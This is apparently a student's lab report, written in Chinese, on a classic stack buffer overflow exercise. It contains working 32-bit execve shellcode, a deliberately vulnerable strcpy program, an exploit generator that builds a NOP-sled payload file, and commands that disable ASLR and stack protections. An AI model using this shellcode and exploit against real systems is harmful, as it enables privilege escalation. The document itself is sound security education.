# 缓存溢出攻击实验

根据课程方向、本人兴趣，进行了buffer overflow实验

## 实验过程
因为系统环境是64位，实验环境需要用32位，因此安装32位的lib。
系统启动内存地址随机化，缓存溢出攻击会被防止，因此关闭内存地址随机化机制，指令如下。

```
sudo sysctl -w kernel.randomize_va_space=0
```

为了重现这一防护措施被实现之前的情形，我们使用另一个shell程序（zsh）代替/bin/bash

```
ln -s /bin/zsh /bin/sh
```

代码分析

- shellcode
```
#include <stdio.h>
int main( ) {
char *name[2];
name[0] = ‘‘/bin/sh’’;
name[1] = NULL;
execve(name[0], name, NULL);
}
```
若执行该代码，则用户可以拿到root权限，汇编版本如下
```
\x31\xc0\x50\x68"//sh"\x68"/bin"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```
-	有漏洞的程序

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str)
{
char buffer[12];
strcpy(buffer, str);

return 1;
}

int main(int argc, char **argv)
{
char str[517];
FILE *badfile;
badfile = fopen("badfile", "r");
fread(str, sizeof(char), 517, badfile);
bof(str);
printf("Returned Properly\n");
return 1;
}
```
因为，该代码使用有漏洞的函数strcpy(),可以导致缓存溢出，由于该函数不检查矩阵的大小，因此可以导致缓存溢出并覆盖现有的数据，如返回地址。
写完代码编译的时候要关闭GCC的缓存溢出防护机制，细节如下。
```
-z execstack ：允许执行stack
-fno-stack-protector ：关闭gcc缓存溢出防护机制。 
```
-	攻击程序
```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=

"\x31\xc0"    //xorl %eax,%eax
"\x50"        //pushl %eax
"\x68""//sh"  //pushl $0x68732f2f
"\x68""/bin"  //pushl $0x6e69622f
"\x89\xe3"    //movl %esp,%ebx
"\x50"        //pushl %eax
"\x53"        //pushl %ebx
"\x89\xe1"    //movl %esp,%ecx
"\x99"        //cdq
"\xb0\x0b"    //movb $0x0b,%al
"\xcd\x80"    //int $0x80
;

void main(int argc, char **argv)
{
char buffer[517];
FILE *badfile;
memset(&buffer, 0x90, 517);
strcpy(buffer,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""攻击代码的地址");
strcpy(buffer+100,shellcode);
badfile = fopen("./badfile", "w");
fwrite(buffer, 517, 1, badfile);
fclose(badfile);
}
```
生成一个文件并写517子节点"\x90"，然后从开到28字节（24字节dummy + 4字节shellcode的地址），再从地100字节写下去shellcode。
由于代码未完成（没有攻击代码地址），因此需要得到其地址，首先用gdb查到buffer的地址，然后加100（\x64）即可得到攻击代码的地址，将攻击程序里的攻击代码地址改成此时得到的地址（例如：\x82\xd5\xff\xff），此时要注意顺序（即little-endian）。 

编译好攻击程序之后，先执行攻击程序，然后执行有漏洞的程序，结果可以拿得到root权限

##练习
1、按照实验步骤进行操作，攻击漏洞程序并获得root权限。

= 已完成

2、通过命令”sudo sysctl -w kernel.randomize_va_space=2“打开系统的地址空间随机化机制，重复用exploit程序攻击stack程序，观察能否攻击成功，能否获得root权限。

= 由于该命令是Linux系统启动内存地址随机化机制，结果攻击不能成功。

3、将/bin/sh重新指向/bin/bash（或/bin/dash），观察能否攻击成功，能否获得root权限。

= bin/bash 里还有防护机制，也不能成功此攻击。

##心得
通过进行缓存溢出攻击实验可以体会缓存溢出的方法并得知栈溢出的原理，希望有在运行防护机制环境下的实验项目。

